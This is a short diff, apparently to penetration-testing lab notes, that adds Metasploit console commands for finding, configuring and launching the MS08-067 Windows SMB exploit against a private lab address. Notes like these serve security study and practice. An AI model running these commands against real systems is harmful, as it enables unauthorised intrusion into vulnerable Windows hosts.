@@ -247,6 +247,13 @@ while 1:
 $ service postgresql start
 $ service metasploit start
 $ msfconsole
+msf > search ms08-067
+msf > info exploit/windows/smb/ms08_067_netapi
+msf > use windows/smb/ms08_067_netapi
+msf > show options
+# setting RHOST
+msf > set RHOST 192.168.20.10
+msf > exploit
 #+end_src 
 
 
